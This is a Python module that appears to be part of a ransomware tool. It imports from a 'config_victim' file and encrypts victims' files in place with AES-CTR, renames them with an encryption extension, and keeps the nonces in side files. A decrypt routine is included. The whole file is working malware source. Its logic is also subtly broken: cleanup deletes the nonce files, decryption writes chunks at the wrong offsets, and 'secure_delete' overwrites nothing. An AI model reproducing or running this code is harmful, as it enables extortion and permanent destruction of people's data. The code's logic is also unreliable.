from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Util import Counter
from Cryptodome.Random import get_random_bytes
import os

from config_victim import (
    ENCRYPTION_EXTENSION, AES_KEY_SIZE, MAX_RETRIES,
    validate_file_for_encryption, VICTIM_CONFIG
)


def encrypt_file_advanced(key, file_path, max_retries=MAX_RETRIES):
    original_file_size = 0
    nonce = None
    temp_files_created = []
    
    try:
        if not validate_file_for_encryption(file_path):
            return False
        
        original_file_size = os.path.getsize(file_path)
        
        for attempt in range(max_retries + 1):
            try:
                nonce = get_random_bytes(8)
                counter = Counter.new(64, prefix=nonce)
                cipher = AES.new(key, AES.MODE_CTR, counter=counter)
                
                temp_encrypted = file_path + '.tmp_enc'
                temp_files_created.append(temp_encrypted)
                
                with open(file_path, 'rb') as original_file, open(temp_encrypted, 'wb') as encrypted_file:
                    chunk_size = 8192
                    
                    while True:
                        chunk = original_file.read(chunk_size)
                        if not chunk:
                            break
                        encrypted_chunk = cipher.encrypt(chunk)
                        encrypted_file.write(encrypted_chunk)
                
                encrypted_size = os.path.getsize(temp_encrypted)
                if encrypted_size != original_file_size:
                    raise ValueError("Encrypted file size mismatch")
                
                os.replace(temp_encrypted, file_path)
                
                nonce_file = file_path + '.nonce'
                with open(nonce_file, 'wb') as nf:
                    nf.write(nonce)
                temp_files_created.append(nonce_file)
                
                final_name = file_path + ENCRYPTION_EXTENSION
                os.rename(file_path, final_name)
                
                if verify_encryption_integrity(final_name, nonce_file, original_file_size):
                    return True
                else:
                    raise ValueError("Encryption integrity check failed")
                    
            except Exception as attempt_error:
                if attempt == max_retries:
                    raise attempt_error
                cleanup_temp_files(temp_files_created)
                temp_files_created = []
                continue
                
    except Exception:
        cleanup_temp_files(temp_files_created)
        return False
        
    finally:
        secure_delete(nonce)
        cleanup_temp_files([f for f in temp_files_created if os.path.exists(f)])


        

def decrypt_file_advanced(key, encrypted_file_path):
    try:
        original_name = encrypted_file_path.replace(ENCRYPTION_EXTENSION, '')
        nonce_file = original_name + '.nonce'
        
        if not os.path.exists(nonce_file):
            return False
        
        with open(nonce_file, 'rb') as nf:
            nonce = nf.read()
        
        counter = Counter.new(64, prefix=nonce)
        cipher = AES.new(key, AES.MODE_CTR, counter=counter)
        
        if os.path.exists(encrypted_file_path):
            with open(encrypted_file_path, 'r+b') as f:
                chunk_size = 4096
                ciphertext = f.read(chunk_size)
                f.seek(0)
                
                while ciphertext:
                    plaintext = cipher.encrypt(ciphertext)
                    f.write(plaintext)
                    ciphertext = f.read(chunk_size)
            
            os.rename(encrypted_file_path, original_name)
            os.remove(nonce_file)
            return True
            
    except Exception as e:
        return False  




def verify_encryption_integrity(encrypted_file, nonce_file, original_size):
    try:
        if not os.path.exists(encrypted_file) or not os.path.exists(nonce_file):
            return False
        
        encrypted_size = os.path.getsize(encrypted_file)
        return encrypted_size == original_size
        
    except Exception:
        return False  
    




def cleanup_temp_files(file_list):
    for file_path in file_list:
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
        except Exception:
            continue



def secure_delete(data):
    if data:
        try:
            if isinstance(data, bytes):
                overwrite_data = get_random_bytes(len(data))
                del overwrite_data
            del data
        except Exception:
            pass